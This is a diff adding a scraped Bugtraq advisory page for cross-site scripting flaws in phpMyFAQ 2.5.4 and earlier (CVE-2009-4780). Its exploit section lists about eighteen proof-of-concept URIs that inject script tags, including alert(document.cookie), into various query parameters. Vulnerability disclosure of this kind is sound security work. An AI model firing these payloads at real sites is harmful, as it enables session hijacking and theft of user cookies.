@@ -1,0 +1,111 @@
+#SpeeDr00t@Black Falcon<br>#bid37180<p><b><span style="font-size: 18pt;">phpMyFAQ 2.5.4 and Prior Multiple Cross Site Scripting Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/37180/info">info</a><br><a href="http://www.securityfocus.com/bid/37180/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/37180/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/37180/solution">solution</a><br><a href="http://www.securityfocus.com/bid/37180/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				37180
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2009-4780<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Dec 01 2009 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Apr 13 2015 09:05PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Amol Naik
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					phpMyFAQ phpMyFAQ 2.5.4 <br/>
+					
+				
+					phpMyFAQ phpMyFAQ 2.5.2 <br/>
+					
+				
+					phpMyFAQ phpMyFAQ 2.5.1 <br/>
+					
+				
+					phpMyFAQ phpMyFAQ 2.5 -dev<br/>
+					
+				
+					phpMyFAQ phpMyFAQ 2.5 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					phpMyFAQ phpMyFAQ 2.5.5 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Attackers can use a browser to exploit this issue.<br/><br/>The following example URIs are available:<br/><br/>http://www.example.com/index.php?action=sitemap&amp;amp;lang=en"&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;<br/>http://www.example.com/index.php?search=hello"&amp;gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&amp;amp;action=search<br/>http://www.example.com/index.php?action=artikel&amp;amp;cat=1&amp;amp;id=1&amp;amp;artlang=en&amp;amp;highlight=you"&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;<br/>http://www.example.com/index.php?action=artikel&amp;amp;cat=1&amp;amp;id=1&amp;amp;artlang=en"&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;<br/>http://www.example.com/index.php?action=sitemap&amp;amp;letter=W&amp;amp;lang=en"&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;<br/>http://www.example.com/index.php?action=sitemap&amp;amp;letter=W"&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;amp;lang=en<br/>http://www.example.com/index.php?sid=7&amp;amp;lang=en"&amp;gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&amp;amp;action=show&amp;amp;cat=1<br/>http://www.example.com/index.php?sid=7&amp;amp;lang=en&amp;amp;action=show&amp;amp;cat=1"&amp;gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;<br/>http://www.example.com/index.php?action=search&amp;amp;tagging_id=1"&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;<br/>http://www.example.com/index.php?action=news&amp;amp;newsid=1&amp;amp;newslang=en"&amp;gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;<br/>http://www.example.com/index.php?action=send2friend&amp;amp;cat=1&amp;amp;id=1&amp;amp;artlang=en"&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;<br/>http://www.example.com/index.php?action=send2friend&amp;amp;cat=1"&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;amp;id=1&amp;amp;artlang=en<br/>http://www.example.com/index.php?action=send2friend&amp;amp;cat=1&amp;amp;id=1"&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;amp;artlang=en<br/>http://www.example.com/index.php?action=translate&amp;amp;cat=1&amp;amp;id=1&amp;amp;srclang=en"&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;<br/>http://www.example.com/index.php?action=translate&amp;amp;cat=1&amp;amp;id=1"&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;amp;srclang=en<br/>http://www.example.com/index.php?action=translate&amp;amp;cat=1"&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;amp;id=1&amp;amp;srclang=en<br/>http://www.example.com/index.php?action=add&amp;amp;question=1&amp;amp;cat=1"&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;<br/>http://www.example.com/index.php?action=add&amp;amp;question=1"&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;amp;cat=1
+	
+		<ul>
+</ul>
+</div>
